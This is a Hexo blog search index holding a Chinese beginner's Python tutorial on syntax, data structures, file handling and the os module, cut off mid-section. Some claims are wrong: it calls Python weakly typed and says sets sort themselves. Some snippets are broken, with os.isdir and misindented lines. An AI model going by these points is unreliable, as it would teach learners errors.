<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python基础(更新中)</title>
      <link href="/2023/07/12/Python%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/07/12/Python%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Python基础教程"><a href="#Python基础教程" class="headerlink" title="Python基础教程"></a>Python基础教程</h1><p>Python是解释型语言</p><h3 id="1-python环境安装"><a href="#1-python环境安装" class="headerlink" title="1.python环境安装"></a>1.python环境安装</h3><p>1.官网下载安装即可</p><p>推荐IDE:Pycharm</p><p>2.升级project Interpreter(升级pip)</p><p>python -m pip install –upgrade pip</p><p>3.快速安装库（安装requests）</p><p>pip install -i <a href="https://pypi.douban.com/simple">https://pypi.douban.com/simple</a> requests</p><p>4.IDE添加python库</p><p><a href="https://pypi.douban.com/simple">https://pypi.douban.com/simple</a></p><h3 id="2-python变量和输出"><a href="#2-python变量和输出" class="headerlink" title="2.python变量和输出"></a>2.python变量和输出</h3><p>文件头</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding : UTF-8 -*-</span></span><br></pre></td></tr></table></figure><p>定义main函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#编程</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>打印函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;haha&quot;</span>)</span><br></pre></td></tr></table></figure><p>注释</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这是单行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>注意:双引号</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#双引号做注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">多行注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#双引号做输入</span></span><br><span class="line">a = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    多行输入</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>python语句结束不需要分号，且为弱类型语言</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = <span class="string">&quot;haha nihao&quot;</span></span><br><span class="line">b = a<span class="comment">#变量赋值</span></span><br></pre></td></tr></table></figure><p>输入函数input输入进来的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#输入并且赋值给变量，输出变量</span></span><br><span class="line">    name = <span class="built_in">input</span>(<span class="string">&quot;请输入你的姓名：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎&quot;</span>,name)</span><br><span class="line"><span class="comment">#输出时变量间可用逗号或加号隔开</span></span><br></pre></td></tr></table></figure><p>用+连接时无空格</p><p>用,连接时有空格</p><p>布尔型</p><p>True &#x3D; 1</p><p>False &#x3D; 0</p><p>实例-格式化输出</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;姓名:&quot;</span>)</span><br><span class="line">age = <span class="built_in">input</span>(<span class="string">&quot;年龄:&quot;</span>)</span><br><span class="line">job = <span class="built_in">input</span>(<span class="string">&quot;工作:&quot;</span>)</span><br><span class="line">info = <span class="string">&quot;name is %s ! age is %s ! job is %s !&quot;</span>%(name,age,job)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></table></figure><p>字符串格式化format输出</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通过位置</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;,&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;Tom&#x27;</span>,<span class="number">20</span>))</span><br><span class="line"><span class="comment">#通过关键字</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;name&#125;&#123;age&#125;&#x27;</span>.<span class="built_in">format</span>(name=<span class="string">&#x27;Tom&#x27;</span>,age=<span class="number">20</span>))</span><br><span class="line"><span class="comment">#列表</span></span><br><span class="line">my_lst=[<span class="string">&#x27;Tom&#x27;</span>,<span class="number">18</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;姓名:&#123;0[0]&#125;年龄:&#123;0[1]&#125;&quot;</span>.<span class="built_in">format</span>(my_lst))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;name=<span class="subst">&#123;变量名&#125;</span>&#x27;</span>)</span><br><span class="line">a=<span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;age=<span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3.运算符"></a>3.运算符</h3><p>数学运算符:</p><p>+-<em>&#x2F;%</em>*</p><p>不等于：!&#x3D;和&lt;&gt;</p><p>等于&#x3D;&#x3D;</p><p>&lt; &gt; &lt;&#x3D; &gt;&#x3D;</p><p>成员运算符</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;asdaabcsad&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a <span class="keyword">in</span> b)</span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure><p>为了避免版本问题，除法最好加上int()</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>(a/b)</span><br></pre></td></tr></table></figure><p>浮点数两者是否相等不要用&#x3D;&#x3D;</p><p>应当用做差看是否为0</p><h3 id="4-流程控制"><a href="#4-流程控制" class="headerlink" title="4.流程控制"></a>4.流程控制</h3><p>if</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">15</span></span><br><span class="line"><span class="keyword">if</span> age &gt; <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;成年了&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> age &gt; <span class="number">15</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;还在读高中&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;还没成年&quot;</span>)</span><br></pre></td></tr></table></figure><p>while</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;游戏开始&quot;</span>)</span><br><span class="line">    <span class="comment"># 取1-100的随机数,含1和100</span></span><br><span class="line">    n = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  <span class="comment"># 无限循环</span></span><br><span class="line">        guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;你猜猜数字是多少:&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> guess &lt; n:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;小了&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> guess &gt; n:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;大了&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;答对了!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;游戏结束&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>input进来的东西都是字符串！！！！！</p><h3 id="5-字符串切片"><a href="#5-字符串切片" class="headerlink" title="5.字符串切片"></a>5.字符串切片</h3><p>字符串是不可变序列，不能修改，只能重新创建</p><p>截取内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;12asad adw adsa&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>:<span class="number">3</span>])<span class="comment">#从第0个开始取三个#a[:]遵循左闭右开的原则</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>:])<span class="comment">#从第2个到最后</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>:-<span class="number">1</span>])<span class="comment">#12asad adw ads从第2个开始取到倒数第一个之前</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">1</span>:<span class="number">10</span>:<span class="number">2</span>])<span class="comment">#从第1个开始取到第10个步长为2</span></span><br><span class="line"><span class="built_in">print</span>(a[::-<span class="number">1</span>])<span class="comment">#得到逆序</span></span><br></pre></td></tr></table></figure><h3 id="6-常用字符串切片方法"><a href="#6-常用字符串切片方法" class="headerlink" title="6.常用字符串切片方法"></a>6.常用字符串切片方法</h3><p>大小写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;ABCabc1234aja0&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a.capitalize())  <span class="comment"># 首字母大写其他自动小写</span></span><br><span class="line"><span class="built_in">print</span>(a.swapcase())  <span class="comment"># 大小写翻转</span></span><br><span class="line"><span class="built_in">print</span>(a.lower()) <span class="comment">#整个字符串转小写</span></span><br><span class="line"><span class="built_in">print</span>(a.upper()) <span class="comment">#整个字符串转大写</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;haha nihao a&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a.title())  <span class="comment"># 每个单词首字母大写</span></span><br><span class="line"><span class="built_in">print</span>(a.center(<span class="number">18</span>, <span class="string">&quot;*&quot;</span>))  <span class="comment"># 将a字符串放在中心，总字符串位置为8，空的位置用*代替</span></span><br><span class="line"><span class="built_in">print</span>(a.startswith(<span class="string">&quot;h&quot;</span>))  <span class="comment"># 判断字符串是否已h开头</span></span><br></pre></td></tr></table></figure><p>判断</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;haha nihao a&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a.startswith(<span class="string">&quot;ni&quot;</span>,<span class="number">5</span>,<span class="number">7</span>))<span class="comment">#计算机的第五个开始取到人类的第七个判断是否以ni开头</span></span><br><span class="line"><span class="built_in">print</span>(a.endswith(<span class="string">&quot;b&quot;</span>))<span class="comment">#判断是否以b作为字符串的结尾</span></span><br><span class="line"><span class="built_in">print</span>(a.find(<span class="string">&quot;ih&quot;</span>))<span class="comment">#发现ih的i在计算机的第几个</span></span><br><span class="line"><span class="built_in">print</span>(a.replace(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="number">2</span>))<span class="comment">#把前两个a替换成N（不加2则为全部替换）</span></span><br><span class="line"><span class="built_in">print</span>(a.isalpha())<span class="comment">#判断a里面是否只有字母</span></span><br><span class="line"><span class="built_in">print</span>(a.isnumeric())<span class="comment">#判断a里是否只有数字</span></span><br><span class="line"><span class="built_in">print</span>(a.isalnum()) <span class="comment"># 判断a里是否只有数字和字母</span></span><br><span class="line"><span class="built_in">print</span>(a.isdecimal()) <span class="comment">#判断a是否是十进制整数</span></span><br></pre></td></tr></table></figure><p>去除左右内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;**haha nihao a**&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a.strip(<span class="string">&#x27;*&#x27;</span>))<span class="comment">#去掉左右的*//也可以指定左右lstrip/rstrip</span></span><br></pre></td></tr></table></figure><p>字符串以.为分界，切割为数组</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;192.168.1.2&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a.split(<span class="string">&#x27;.&#x27;</span>))<span class="comment">#以点分割形成列表</span></span><br></pre></td></tr></table></figure><p>len函数可以得到字符串长度</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">len</span>(a)</span><br></pre></td></tr></table></figure><p>传地址-id 查内存地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">&quot;haha&quot;</span></span><br><span class="line">s2 = s1[:]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(s2))</span><br></pre></td></tr></table></figure><p>判断变量是否为字符串</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>(s1)==<span class="built_in">str</span></span><br><span class="line"><span class="built_in">isinstance</span>(s1,<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><h3 id="7-列表"><a href="#7-列表" class="headerlink" title="7.列表[]"></a>7.列表[]</h3><p>列表是有序的</p><p>增删</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">li = [<span class="string">&#x27;xiaoming&#x27;</span>,<span class="string">&#x27;xiaoli&#x27;</span>,<span class="string">&#x27;xiaohong&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(li)</span><br><span class="line"><span class="comment">#将haha插入第一位，后面的顺移</span></span><br><span class="line"><span class="comment">#列表位数从零开始</span></span><br><span class="line">li.insert(<span class="number">1</span>,<span class="string">&#x27;haha&#x27;</span>)</span><br><span class="line"><span class="comment">#将nihao插入到最后</span></span><br><span class="line">li.append(<span class="string">&#x27;nihao&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除最后一个</span></span><br><span class="line">li.pop()</span><br><span class="line"><span class="comment">#批量删除</span></span><br><span class="line"><span class="keyword">del</span> li[<span class="number">1</span>:<span class="number">3</span>]<span class="comment">#删除第一个到第三个，第三个没有被删，1和2被删了</span></span><br><span class="line"><span class="comment">#精确删除</span></span><br><span class="line">li.remove(<span class="string">&#x27;xiaoli&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除所有</span></span><br><span class="line">li.clear()</span><br></pre></td></tr></table></figure><p>改</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">li = [<span class="string">&#x27;xiaoming&#x27;</span>,<span class="string">&#x27;xiaoli&#x27;</span>,<span class="string">&#x27;xiaohong&#x27;</span>]</span><br><span class="line"><span class="comment">#将第1个修改成haha</span></span><br><span class="line">li[<span class="number">1</span>] = <span class="string">&#x27;haha&#x27;</span></span><br></pre></td></tr></table></figure><p>列表扩展</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">b = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line">a.extend(b)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>查找</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">li = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"><span class="comment"># 计算有2出现的次数</span></span><br><span class="line">ret = li.count(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br><span class="line"><span class="comment"># 查找5第一个出现的位置</span></span><br><span class="line">ret = li.index(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br></pre></td></tr></table></figure><h3 id="8-字典"><a href="#8-字典" class="headerlink" title="8.字典{}"></a>8.字典{}</h3><p>字典是无序的，以键值对记录数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dic = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="string">&quot;18&quot;</span>,<span class="string">&quot;job&quot;</span>:<span class="string">&quot;driver&quot;</span>&#125;</span><br><span class="line"><span class="comment">#在字典里增加数据</span></span><br><span class="line">dic[<span class="string">&#x27;home&#x27;</span>]=<span class="string">&quot;xuanwuqu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除</span></span><br><span class="line">dic.pop(<span class="string">&quot;age&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#改</span></span><br><span class="line">dic[<span class="string">&quot;job&quot;</span>]=<span class="string">&quot;cooker&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查</span></span><br><span class="line">value = dic[<span class="string">&quot;name&quot;</span>]</span><br><span class="line"><span class="comment">#查a，查不到出现xxx</span></span><br><span class="line">value2 = dic.get(<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;xxx&#x27;</span>)<span class="comment">#查到了输出查找内容</span></span><br><span class="line"><span class="comment">#查job查得到不出现xxx</span></span><br><span class="line">value2 = dic.get(<span class="string">&quot;job&quot;</span>,<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#遍历字典的内容</span></span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> dic.items():</span><br><span class="line">    <span class="built_in">print</span>(key+<span class="string">&quot;---------&quot;</span>+value)</span><br><span class="line"><span class="comment">#只遍历键</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">   <span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment">#只遍历值</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="built_in">print</span>(dic[j])</span><br><span class="line">    </span><br><span class="line"><span class="comment">#以列表形式显示键</span></span><br><span class="line"><span class="built_in">print</span>(dic.keys())</span><br><span class="line"><span class="comment">#以列表形式显示值</span></span><br><span class="line"><span class="built_in">print</span>(dic.values())</span><br></pre></td></tr></table></figure><h3 id="9-集合"><a href="#9-集合" class="headerlink" title="9.集合{}"></a>9.集合{}</h3><p>无序，但是不允许重复，会自动排序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>&#125;</span><br><span class="line">set2 = &#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#增</span></span><br><span class="line">set1.add(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删,删除值为3</span></span><br><span class="line">set1.remove(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#随机删除</span></span><br><span class="line">set1.pop()</span><br><span class="line"><span class="comment">#删除所有</span></span><br><span class="line">set1.clear()</span><br><span class="line"></span><br><span class="line"><span class="comment">#取交集</span></span><br><span class="line"><span class="built_in">print</span>(set1 &amp; set2)</span><br><span class="line"><span class="comment">#取并集</span></span><br><span class="line"><span class="built_in">print</span>(set1 | set2)</span><br><span class="line"><span class="comment">#取差集</span></span><br><span class="line"><span class="built_in">print</span>(set1 - set2)</span><br><span class="line"><span class="comment">#取反交集</span></span><br><span class="line"><span class="built_in">print</span>(set1 ^ set2)</span><br></pre></td></tr></table></figure><h3 id="10-元祖（）"><a href="#10-元祖（）" class="headerlink" title="10.元祖（）"></a>10.元祖（）</h3><p>tuple有序</p><p>()无法改变</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t1 = (<span class="string">&quot;haah1&quot;</span>,<span class="string">&quot;haha2&quot;</span>,<span class="string">&quot;haha3&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(t1[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>转换</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="string">&#x27;li1&#x27;</span>,<span class="string">&#x27;li2&#x27;</span>,<span class="string">&#x27;li3&#x27;</span>,<span class="string">&#x27;li4&#x27;</span>,<span class="string">&#x27;li5&#x27;</span>]</span><br><span class="line">y = (<span class="string">&quot;haah1&quot;</span>,<span class="string">&quot;haha2&quot;</span>,<span class="string">&quot;haha3&quot;</span>)</span><br><span class="line"><span class="comment">#把列表转为元组</span></span><br><span class="line">x1 = <span class="built_in">tuple</span>(x)</span><br><span class="line"><span class="comment">#把列表转为集合</span></span><br><span class="line"> x1 = <span class="built_in">set</span>(x)</span><br><span class="line"><span class="comment">#把元组转为列表</span></span><br><span class="line">y1 = <span class="built_in">list</span>(y)</span><br><span class="line">    y1[<span class="number">0</span>]=<span class="string">&#x27;22121&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(y1)</span><br></pre></td></tr></table></figure><p>在数据量大的时候,元祖性能更加</p><p>当只有一个元素时,写元祖要在元祖第一个元素后写上一个逗号</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">v = (<span class="number">1</span>,)</span><br></pre></td></tr></table></figure><h3 id="11-文件操作"><a href="#11-文件操作" class="headerlink" title="11.文件操作"></a>11.文件操作</h3><p>r-读</p><p>w-写</p><p>a-追加</p><p>r+ w+ a+ 基于字符的读写</p><p>对于二进制的读写</p><p>rb wb ab</p><p>文件的本质–句柄（唯一标识符）</p><p>打开文件时系统会有一串数字表示该文件的一切</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#f就是句柄</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line"><span class="comment">#从句柄中读取内容</span></span><br><span class="line">data = f.read()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭文件句柄</span></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>按行读取</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.readline()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="comment">#一行一行读取，每执行一次就读一行</span></span><br><span class="line"><span class="comment">#读完之后读取的内容是空</span></span><br><span class="line">data = f.readline()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="comment">#读取每一行并保存为列表</span></span><br><span class="line">data = f.readlines()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><p>每次读取一部分</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">info = f.read(<span class="number">4</span>)<span class="comment">#每次读取4个字</span></span><br><span class="line">    <span class="built_in">print</span>(info)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(info) ==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>写文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#写入内容</span></span><br><span class="line"><span class="comment">#覆盖写入</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;nihao&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#追加写入</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;?aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>免关闭文件操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;hahahahha&quot;</span>)    </span><br><span class="line"></span><br><span class="line"><span class="comment">#同时操作两个文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f1,<span class="built_in">open</span>(<span class="string">&quot;./b.txt&quot;</span>,<span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    data = f1.read()</span><br><span class="line">    data = data.replace(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">    f2.write(data)</span><br></pre></td></tr></table></figure><p>游标 file.seek</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment">#查看当前游标位置</span></span><br><span class="line">        <span class="built_in">print</span>(f.tell())</span><br><span class="line">        <span class="comment">#注意截取状况</span></span><br><span class="line">        <span class="comment">#将游标移动到</span></span><br><span class="line">        f.seek(<span class="number">22</span>)</span><br><span class="line">        buffer = f.read()</span><br><span class="line">        <span class="built_in">print</span>(f.tell())</span><br><span class="line">        <span class="built_in">print</span>(buffer.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="12-操作系统命令"><a href="#12-操作系统命令" class="headerlink" title="12.操作系统命令"></a>12.操作系统命令</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os<span class="comment">#操作系统的包</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">        <span class="comment">#新建文件夹</span></span><br><span class="line">        os.mkdir(<span class="string">&quot;c:/abcd&quot;</span>)</span><br><span class="line">        <span class="comment">#删除文件夹</span></span><br><span class="line">        os.rmdir(<span class="string">&quot;c:/abcd&quot;</span>)</span><br><span class="line">        <span class="comment">#列出文件夹的内容</span></span><br><span class="line">        <span class="built_in">print</span>(os.listdir(<span class="string">&quot;c:/&quot;</span>))</span><br><span class="line">        <span class="comment">#执行命令</span></span><br><span class="line">        os.system(<span class="string">&quot;ipconfig&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(os.system)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#判断文件是否存在</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#绝对路径</span></span><br><span class="line">    <span class="built_in">print</span>(os.path.isfile(<span class="string">&quot;c:/pythontest/a.txt&quot;</span>))</span><br><span class="line">    <span class="comment">#相对路径</span></span><br><span class="line">    <span class="built_in">print</span>(os.path.isfile(<span class="string">&quot;./a.txt&quot;</span>))</span><br><span class="line">    <span class="comment">#判断是否为文件夹</span></span><br><span class="line">    <span class="built_in">print</span>(os.isdir(<span class="string">&quot;c:\123&quot;</span>))</span><br><span class="line">    <span class="comment">#判断指定路径文件是否存在</span></span><br><span class="line">    <span class="built_in">print</span>(os.path.exists(<span class="string">&quot;C:\a.txt&quot;</span>))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="13-函数介绍"><a href="#13-函数介绍" class="headerlink" title="13.函数介绍"></a>13.函数介绍</h3><p>无返回值函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_len</span>():</span><br><span class="line">    s = <span class="string">&#x27;haha nihaoa&#x27;</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        length +=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(length)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 